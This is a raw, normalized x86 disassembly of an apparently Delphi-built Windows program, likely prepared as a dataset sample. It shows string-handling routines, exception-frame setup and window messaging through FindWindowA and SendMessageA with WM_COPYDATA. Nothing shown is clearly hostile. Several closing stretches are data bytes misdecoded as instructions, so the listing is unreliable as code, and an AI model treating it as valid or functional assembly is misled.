dec [ ebp - 0x100 ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
push 0xffffffff
mov edx rw-data
lea eax [ ebp - 0x88 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x10c ] 0xcc
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x18 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x88 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x84 ]
mov edx 0x2
call sub_4d318c
push 0xffffffff
mov edx rw-data
lea eax [ ebp - 0x90 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x8c ]
push ecx
mov [ ebp - 0x10c ] 0xd8
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x1c ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x8c ]
mov edx 0x2
call sub_4d318c
push 0x280
mov edx rw-data
lea eax [ ebp - 0x98 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x94 ]
push ecx
mov [ ebp - 0x10c ] 0xe4
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x20 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x98 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x94 ]
mov edx 0x2
call sub_4d318c
push 0x190
mov edx rw-data
lea eax [ ebp - 0xa0 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x9c ]
push ecx
mov [ ebp - 0x10c ] 0xf0
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x24 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xa0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x9c ]
mov edx 0x2
call sub_4d318c
push 0x176
mov edx rw-data
lea eax [ ebp - 0xa8 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xa4 ]
push ecx
mov [ ebp - 0x10c ] 0xfc
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x28 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xa8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xa4 ]
mov edx 0x2
call sub_4d318c
push 0x4b
mov edx rw-data
lea eax [ ebp - 0xb0 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xac ]
push ecx
mov [ ebp - 0x10c ] 0x108
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x2c ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xb0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xac ]
mov edx 0x2
call sub_4d318c
push 0xbf
mov edx rw-data
lea eax [ ebp - 0xb8 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xb4 ]
push ecx
mov [ ebp - 0x10c ] 0x114
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x30 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xb8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_4d318c
push 0x2a
mov edx rw-data
lea eax [ ebp - 0xc0 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xbc ]
push ecx
mov [ ebp - 0x10c ] 0x120
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x34 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xc0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xbc ]
mov edx 0x2
call sub_4d318c
lea eax [ ebx + 0x38 ]
mov edx [ eax ]
test edx edx
je r-xdata
push 0x0
push rw-data
call FindWindowA
mov esi eax
test esi esi
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x10c ] 0x84
mov edx 0x3
mov eax [ ebp - 0x4c ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x10c ] 0x6c
push 0x4c
call sub_4bbbac
pop ecx
mov [ ebp - 0xf0 ] eax
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0x10c ] 0x168
mov edx 0x3
mov eax [ ebp - 0xec ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x10c ] 0x150
mov eax 0x1
push eax
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
pop eax
mov edx [ ebp - 0x11c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea eax [ ebx + 0x38 ]
mov edx [ eax ]
test edx edx
je r-xdata
mov ecx [ ebp - 0xf0 ]
mov [ ebp - 0x10c ] 0x18c
mov edx [ ebp - 0xf0 ]
push edx
call sub_411d80
pop ecx
mov [ ebp - 0x10c ] 0x174
mov ecx [ ebp - 0xf0 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ eax ]
mov eax [ ecx - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0xf4 ]
mov [ ebp - 0x10c ] 0x1b0
mov edx [ ebp - 0xf4 ]
push edx
call sub_411e58
pop ecx
mov [ ebp - 0x10c ] 0x198
mov ebx [ ebp - 0xf4 ]
jmp r-xdata
mov [ rw-data ] ecx
push 0x48
call sub_4bbbac
pop ecx
mov [ ebp - 0xf4 ] eax
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x8065
push esi
call SendMessageA
lea edi [ ebx + 0x38 ]
xor edx edx
mov [ ebp - 0x134 ] edx
mov eax [ edi ]
test eax eax
jne r-xdata
test eax eax
jle r-xdata
mov ebx [ ebp - 0xf8 ]
mov [ ebp - 0x10c ] 0x1d4
mov edx [ ebp - 0xf8 ]
push edx
call sub_41a330
pop ecx
mov [ ebp - 0x10c ] 0x1bc
mov ebx [ ebp - 0xf8 ]
jmp r-xdata
mov [ rw-data ] ebx
push ebx
call sub_4120c8
pop ecx
push 0x28
call sub_4bbbac
pop ecx
mov [ ebp - 0xf8 ] eax
test eax eax
je r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov edx rw-data
jmp r-xdata
mov [ rw-data ] ebx
push ebx
call sub_41a4a4
pop ecx
xor eax eax
push eax
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
pop eax
mov edx [ ebp - 0x11c ]
mov [ fs : 0x0 ] edx
mov edx [ edi ]
mov eax [ edi ]
movzx edx [ eax - 0xa ]
cmp edx 0x2
jne r-xdata
mov [ ebp - 0x12c ] edx
lea eax [ ebx + 0x38 ]
mov edx [ eax ]
test edx edx
je r-xdata
xor eax eax
mov ecx [ eax ]
mov eax [ ecx - 0x4 ]
jmp r-xdata
mov eax edi
call j_sub_44a5d8#2
mov edx edi
mov eax edi
call sub_41e5d8
inc eax
lea edx [ ebp - 0x134 ]
mov [ ebp - 0x130 ] eax
push edx
push 0x0
push 0x4a
push esi
call SendMessageA
sub_405948
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_4d3050
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0xc
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x20 ] 0x24
lea eax [ ebp - 0xc ]
call sub_4d3050
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4313a0
add [ ebp - 0x14 ] 0x3
mov [ ebp - 0x20 ] 0x18
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x18
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_4d369c
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_405a7c
push ebp
mov ebp esp
add esp 0xffffff30
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0xc0 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xb4 ]
inc [ ebp - 0xb4 ]
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebx + 0x4 ]
inc [ ebp - 0xb4 ]
inc [ ebp - 0xb4 ]
lea edx [ ebp - 0x4 ]
lea ecx [ ebp - 0x8 ]
call sub_402e08
xor edx edx
mov [ ebp - 0xc ] edx
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
call sub_41e604
lea ecx [ ebp - 0xc ]
mov dl 0x1
inc [ ebp - 0xb4 ]
mov eax [ r-xdata ]
mov ecx [ ecx ]
call sub_405948
mov esi eax
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xb4 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0xc0 ] 0xc
lea edi [ ebx + 0x8 ]
xor eax eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov edx edi
call sub_41e604
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0xb4 ]
mov eax [ ecx ]
push eax
mov edx rw-data
lea eax [ ebp - 0x14 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
lea eax [ ebp - 0x10 ]
push edx
mov edx rw-data
mov [ ebp - 0xc0 ] 0x24
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x4 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x10 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x20 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x1c ]
push ecx
mov [ ebp - 0xc0 ] 0x30
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x14 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x28 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x24 ]
push ecx
mov [ ebp - 0xc0 ] 0x3c
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0xd ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x30 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x2c ]
push ecx
mov [ ebp - 0xc0 ] 0x48
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x14 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0xe ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x38 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x34 ]
push ecx
mov [ ebp - 0xc0 ] 0x54
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x14 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0xf ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x40 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x3c ]
push ecx
mov [ ebp - 0xc0 ] 0x60
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x14 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x18 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x48 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x44 ]
push ecx
mov [ ebp - 0xc0 ] 0x6c
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x1c ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x50 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x4c ]
push ecx
mov [ ebp - 0xc0 ] 0x78
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x20 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x58 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x54 ]
push ecx
mov [ ebp - 0xc0 ] 0x84
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x24 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x60 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x5c ]
push ecx
mov [ ebp - 0xc0 ] 0x90
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x60 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x5c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x28 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x68 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x64 ]
push ecx
mov [ ebp - 0xc0 ] 0x9c
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x64 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x2c ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x70 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x6c ]
push ecx
mov [ ebp - 0xc0 ] 0xa8
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x6c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x30 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x78 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x74 ]
push ecx
mov [ ebp - 0xc0 ] 0xb4
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x34 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x80 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x7c ]
push ecx
mov [ ebp - 0xc0 ] 0xc0
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0xc ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x80 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
lea edi [ ebx + 0x38 ]
xor eax eax
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x8c ]
mov edx edi
call sub_41e604
lea ecx [ ebp - 0x8c ]
inc [ ebp - 0xb4 ]
mov eax [ ecx ]
push eax
mov edx rw-data
lea eax [ ebp - 0x88 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
lea eax [ ebp - 0x84 ]
push edx
mov edx rw-data
mov [ ebp - 0xc0 ] 0xcc
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x4 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x8c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x88 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x84 ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0x3c ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x94 ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x90 ]
push ecx
mov [ ebp - 0xc0 ] 0xd8
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x14 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x94 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0x3d ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x9c ]
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x98 ]
push ecx
mov [ ebp - 0xc0 ] 0xe4
call sub_4d3010
inc [ ebp - 0xb4 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x14 ]
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x9c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb4 ]
lea eax [ ebp - 0x98 ]
mov edx 0x2
call sub_4d318c
mov edi esi
mov [ ebp - 0xa4 ] edi
test edi edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0xc0 ] 0x108
mov edx 0x3
mov eax [ ebp - 0xa4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0xc0 ] 0xf0
mov edx [ rw-data ]
mov [ ebp - 0xac ] edx
mov ecx [ ebp - 0xac ]
test ecx ecx
je r-xdata
mov [ ebp - 0xa8 ] eax
mov edx [ ebp - 0xa8 ]
test edx edx
je r-xdata
xor edx edx
mov [ rw-data ] edx
mov ecx [ rw-data ]
push ecx
call sub_4b0180
pop ecx
xor eax eax
mov [ rw-data ] eax
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ ebp - 0xc0 ] 0x150
push 0x3
mov eax [ ebp - 0xac ]
push eax
call sub_412a00
mov [ ebp - 0xc0 ] 0x138
add esp 0x8
xor eax eax
mov [ rw-data ] eax
mov [ ebp - 0xc0 ] 0x12c
push 0x3
mov ecx [ ebp - 0xa8 ]
push ecx
call sub_41a3e8
mov [ ebp - 0xc0 ] 0x114
add esp 0x8
mov edx [ ebp - 0xd0 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call ReleaseMutex
sub_406800
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0x10 ] ecx
xor edx edx
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x18 ] edx
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi [ ebx + 0x14 ]
mov edi [ ebx + 0x10 ]
lea edx [ ebx + 0x8 ]
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ecx
push [ eax + 0x4 ]
push [ eax ]
mov ecx [ ebp - 0x4 ]
push ecx
push esi
push edi
call sub_406ae0
add esp 0x14
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
push edx
call sub_4b0180
pop ecx
push ebx
call sub_4b0180
pop ecx
sub_406883
inc [ 0x60000000 ]
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
sub [ ecx + 0x558dd855 ] cl
mov eax 0x89d84d8b
dec esp
and al 0x8
cmp bh [ fs : edx ]
pop edi
push esi
arpl [ gs : edi + ebp * 2 + 0x72 ] si
pop edi
jbe r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_4b0180
pop ecx
add esp 0xfffffff0
mov eax [ ebx + 0x28 ]
mov edi [ eax ]
mov [ esp + 0x8 ] edi
push ebx
push edx
call sub_406b64
mov esi [ ebx + 0x28 ]
add esp 0x28
mov eax esi
mov [ ebp - 0x2c ] esi
add eax 0x4
mov edx esi
clc
insb
cmp al 0x54
inc ecx
jo r-xdata
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
sub al 0x73
je r-xdata
cmp bh [ edx ]
popad
insb
insb
outsd
arpl [ ecx + 0x74 ] sp
outsd
jb r-xdata
add [ ebp - 0x998b25 ] al
dec ebp
push esp
inc ecx
jo r-xdata
add edx 0x8
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x38 ] esi
mov ecx [ ebp - 0x38 ]
push ecx
call sub_4b0180
pop ecx
xor eax eax
mov [ ebx + 0x28 ] eax
xor edx edx
mov [ ebx + 0x2c ] edx
test [ ebp + 0xc ] 0x1
je r-xdata
aam 0x83
rol [ ebx + ecx * 4 ] 0xd6
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
and [ esi ] bh
add [ eax ] al
add [ eax ] al
in al 0x8e
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffb8
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
add esp 0xfffffff0
mov edx [ ebx + 0x28 ]
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x48 ]
mov ecx [ ebp - 0x28 ]
mov [ esp + 0x8 ] ecx
dec [ ebp - 0x8 ]
sub_40698b
inc [ edi ]
add [ eax ] al
add al ah
add al dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x100408d ] ah
add ah dh
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
push esp
jb r-xdata
outsd
jb r-xdata
cmp al 0x73
je r-xdata
add [ eax ] al
add ah bh
jae r-xdata
je r-xdata
cmp bh [ edx ]
pop edi
push esp
insd
popad
jo r-xdata
mov edx [ ebp - 0x24 ]
sub [ ebp - 0x8 ] 0x11
cmp bh [ fs : edx ]
jo r-xdata
cmp bh [ edx ]
cmp dh [ eax + 0x61 ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
imul esi [ edx + 0x3c ] 0x736e6f63
je r-xdata
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
and [ gs : edx ] ch
and [ esi ] bh
sub al 0x30
and [ esi ] bh
push ebx
jns r-xdata
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x74737953
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
je r-xdata
call sub_4d36a4
add [ ebx + ebx * 8 - 0x3974f882 ] al
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
and [ gs : edx ] ch
sub al 0x73
je r-xdata
xor edx edx
mov eax esi
call sub_401f40
insd
cmp bh [ edx ]
push ebp
add [ eax ] al
add [ eax ] al
cld
xor [ esi ] bh
and [ esi ] bh
cmp bh [ edx ]
insb
